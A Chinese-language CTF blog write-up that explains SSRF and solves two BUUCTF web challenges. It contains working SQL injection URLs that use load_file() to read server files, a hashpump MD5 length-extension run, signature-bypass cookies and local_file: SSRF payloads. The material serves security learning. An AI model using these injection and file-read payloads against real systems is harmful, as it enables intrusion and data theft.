---
title: '快速入门web-ssrf及buuctf西电题解'
categories:
  - 
tags: []
abbrlink: 5a026fe1
date: 2026-03-07 14:30:44
---
# 快速入门web-ssrf及buuctf西电题解

## 		SSRF = 服务器端请求伪造

## 特点

1. **主体是服务器**：请求是「服务器发起」的，不是你的电脑；
2. **权限是服务器的权限**：服务器能访问的资源（本地文件、内网 IP），你本来访问不到，但通过 SSRF 就能间接访问；
3. **核心是 “伪造请求”**：你伪造一个服务器会执行的请求（比如本地文件地址、内网地址），服务器替你执行。



## [网鼎杯 2018]Fakebook

### 1



1.注册登陆界面，sqlmap扫描



```powershell
python dirsearch.py -u "http://3992b9c4-b99e-44db-96b6-111d3cb92681.node5.buuoj.cn:81/" -e php --threads 1 --delay 3 -w ./ctf_core.txt
```



![image-20251217210112375](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217210112375.png![image-20251217210507607](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217210507607.png)



![image-20251217204024349](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217204024349.png)

打开备份文件



```
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```



方法一：

```plaintext
用户构造恶意序列化字符串 → 后端用unserialize()解析 → 生成篡改了blog属性的UserInfo对象 → 调用getBlogContents() → 执行curl_exec() → 读取flag.php
```











方法2：sql注入

注册，登录，发现蓝字

![image-20251217215524707](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217215524707.png)



点击得到no参数





![image-20251217215543418](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217215543418.png)



发现过滤

![image-20251217210311771](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217210311771.png)





![image-20251217210702831](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217210702831.png)





2.1

```
view.php?no=-1%20union/**/select%201,2,3,4--+
```

为什么是-1不是1？

1. **no=-1**：靶机里根本没有编号为 - 1 的记录，原 SQL 查询返回空结果；此时`union select`的结果会补位显示在页面上，注入成功。
2. **no=1**：靶机里有编号为 1 的真实记录，原 SQL 查询结果会覆盖`union select`的结果，你看不到注入效果（或因列类型不兼容直接报错），看似 “失败”。

核心就一句话：`-1`让原查询无结果，注入语句的结果能显示；`1`让原查询有结果，把注入结果盖住了。

这就是为什么我前面在输入1的时候注入点一直返回admin用户名，而没有任何回显

![image-20251217212408795](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217212408795.png)



得到回显位为2



2.2

view.php?no=-1%20union/**/select 1,database(),3,4--+



![image-20251217212559085](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217212559085.png)

2. 3

   ?no=-1 union/**/select 1,user(),3,4--+　　　　//数据库信息**,查看权限

```
root@localhos
```

为什么要查看权限？



① **确认权限**：`user()`能看当前数据库用户的权限（比如是不是 root）——root 权限能直接读 / 写文件、查所有库，普通用户只能查当前库；

② **定位目标**：`database()`能知道靶机的核心数据库名（比如`buu_flag`），后续直接查这个库的表 / 字段，就能找到 flag；

③ **验证环境**：比如查`version()`（数据库版本），能判断用什么注入技巧（比如 MySQL5.5 和 8.0 的注入方法有差异）。



是root权限，利用load_file()函数可以用绝对路径去加载一个文件，

load_file(file_name):file_name是一个完整的路径，

于是我们直接用var/www/html/flag.php路径去访问一下这个文件



### 一、核心原理

`load_file()` 是 MySQL 的文件读取函数，root 权限下能直接读取服务器上的文件；`/var/www/html/` 是 Linux 服务器中 PHP 网站的默认根目录，`flag.php` 大概率放在这里，把这个路径传给`load_file()`，就能通过 SQL 注入读取文件内容。

1. 写法：`union select 1,load_file('绝对路径'),3,4`（把路径换成`/var/www/html/flag.php`）；
2. 操作：浏览器直接访问拼接后的 URL，页面会显示`flag.php`的内容；
3. 兜底：读不到就换路径 / 加`hex()`转码，CTF 靶机的`flag.php`几乎都在`/var/www/html/`下，root 权限必能读到

### 二、注入语句写法

 `user()` 替换成 `load_file('/var/www/html/flag.php')` 即可，最终完整 URL：





```
view.php?no=-1union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+
```





```plaintext
# 备用1：网站根目录简写
load_file('/var/www/flag.php')
# 备用2：nginx/apache默认路径
load_file('/usr/share/nginx/html/flag.php')
# 备用3：临时目录
load_file('/tmp/flag.php')
```



为什么是这个路径，报错时候有显示，请看下图：

![image-20251217214135585](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217214135585.png)

![image-20251217213911581](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251217213911581.png)





注入之后发现并没有flag，去抓包看看





**view.php?no=-1%20union/**/select 1,group_concat,3,4--+









## [De1CTF 2019]SSRF Me

### 1



```
#! /usr/bin/env python
# encoding=utf-8

from flask import Flask, request
import socket
import hashlib
import urllib
import sys
import os
import json

# Python 2 特有的编码设置
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)
secert_key = os.urandom(16)  # 随机生成 16 位密钥

class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        # 为每个 IP 创建独立的沙箱目录
        if not os.path.exists(self.sandbox):
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        
        # 1. 验证签名是否正确
        if self.checkSign():
            # 2. 如果 action 包含 "scan" 执行扫描逻辑
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    tmpfile.write(resp)
                tmpfile.close()
                result['code'] = 200
            
            # 3. 如果 action 包含 "read" 执行读取逻辑
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
                f.close()

            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
            
        return result

    def checkSign(self):
        # 核心防御：对比用户传来的签名和服务器根据 key 生成的是否一致
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False

# 路由 1：获取 scan 操作的合法签名
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)

# 路由 2：核心挑战接口
@app.route('/De1ta', methods=['GET', 'POST'])
def challenge():
    # 从 Cookie 和参数中获取数据
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    
    # 简单的 Web 过滤
    if (waf(param)):
        return "No Hacker!!!!"
    
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())

# 路由 3：首页显示源码
@app.route('/')
def index():
    return open("code.txt", "r").read()

# 基础功能：模拟扫描（SSRF）
def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"

# 签名生成函数
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()

def md5(content):
    return hashlib.md5(content).hexdigest()

# WAF 过滤函数
def waf(param):
    check = param.strip().lower()
    # 禁止使用 gopher 和 file 协议
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False

if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0', port=80)
```



精简

```
class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)

    def Exec(self):
        result = {}
        result['code'] = 500
        
        # 1. 验证签名是否正确
        if self.checkSign():
            # 2. 如果 action 包含 "scan" 执行扫描逻辑
            if "scan" in self.action:
                
            
            # 3. 如果 action 包含 "read" 执行读取逻辑
            if "read" in self.action:

    def checkSign(self):
        # 核心防御：对比用户传来的签名和服务器根据 key 生成的是否一致
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False

# 路由 1：获取 scan 操作的合法签名
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)

# 路由 2：核心挑战接口
@app.route('/De1ta', methods=['GET', 'POST'])
def challenge():
    # 从 Cookie 和参数中获取数据
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
 
    
    task = Task(action, param, sign, ip)  
    return json.dumps(task.Exec())    
    
# 签名生成函数
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()   
```

理解：

我们需要在/De1ta传入参数：param，action，sign

并保证sign =  md5后的数据（密钥+param+action）

若成功我们就可以用exec读取和扫描了



那么首先我们需要sign

![image-20260126191859981](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260126191859981.png)









目标：传个read进去

解法一：逻辑漏洞

因为md5(secert_key + param + action)没有分隔符，所以我们在param传入flag.txtread会直接和后面的action：scan粘在一起，

这样我们就有读取权限了



1.

/geneSign?param=flag.txtread得到7450ad124bceda23373cbef9ed2dab35



2.构造：

cookie：

sign=7450ad124bceda23373cbef9ed2dab35;action=readscan

/De1ta?param=flag.txt

这里为什么不能传入后缀read，因为若你传入param=flag.txtread，那getsign合并的就是 密钥flag.txtreadreadscan,!=genesign生成的 密钥flag.txtreadscan

那么就不能返回exec里面的read和scan功能了

```
if (getSign(self.action, self.param) == self.sign):
            return True
            ....
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()            
    ....
task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())    
```



解法二：md5长度攻击

已知md5(secert_key + param + action)

可以推算出md5(secert_key + param + action`+padding+read`)

原因：MD5 算法允许我们在知道 A 的情况下，通过补齐“填充数据”，直接推算出 B。

```
root@peri0d:~/HashPump# hashpump
Input Signature: 8370bdba94bd5aaf7427b84b3f52d7cb
Input Data: scan
Input Key Length: 24
Input Data to Add: read
d7163f39ab78a698b3514fd465e4018a
scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read
```



解法三：利用python urllib漏洞（在找不到file位置的情况下）

先看代码

```
def Exec(self):
    # 阶段一：Scan 
    if "scan" in self.action:
        # 1. 创建一个临时的中间文件 result.txt
        tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
        
        # 2. 【关键点】真正去读 flag 的是这一行！
        # 这里调用了 scan(param)，也就是 urllib.urlopen(param)
        resp = scan(self.param) 
        
        # 3. 把 flag 的内容写入 result.txt
        tmpfile.write(resp)
        tmpfile.close()

    # 阶段二：Read 
    if "read" in self.action:
        # 4. 打开刚才那个 result.txt
        f = open("./%s/result.txt" % self.sandbox, 'r')
        
        # 5. 把 result.txt 的内容返回给你
        result['data'] = f.read()
```







3.0 为什么能利用urllib：

```
# Python 2.7 urllib 内部逻辑简化版
def urlopen(url):
    type = url.split(':')[0] # 获取协议头
    
    if type == 'http':
        return network_request(url)
    elif type == 'file' OR type == 'local_file': # local_file也是读取本地文件
        return open_local_disk_file(url)
```

3.1 urllib是什么？

```
是 Python 自带的标准库，专门用来处理网址（URL）和发网络请求

作用：就像一个程序版的“浏览器”。你可以写代码让它去访问百度、下载图片、或者像浏览器一样发送数据给服务器。
```

3.2 urllib 和 urllib2 的差异

```
urllib ：若无协议头。默认本地读取
urllib2：必须要加上协议头才能读，比如 file:///flag.txt，否则报错 unknown url type。
```

3.3 相对路径和绝对路径

```
local_file:flag.txt（相对路径）
    意思：就在当前目录下找 flag.txt。

local_file:///app/flag.txt（绝对路径）
    注意那个 //，在 URL 规范里，通常后面接的是绝对路径。
    意思：去系统根目录下的 app 文件夹里找 flag.txt。
```

3.3 payload：(针对在当前路径下读取)绝对路径方法+相对路径方法

```
1.param=local_file:///proc/self/cwd/flag.txt
tips：CWD -> Current Working Directory -> “当前工作目录”

2.param=local_file:flag.txt
```

不清楚/proc/self是啥->详见我的 Linux `/proc` 文件系统（`/proc/self`）的学习笔记



步骤：获得sign，若不知道flag位置用这个方法读取读取

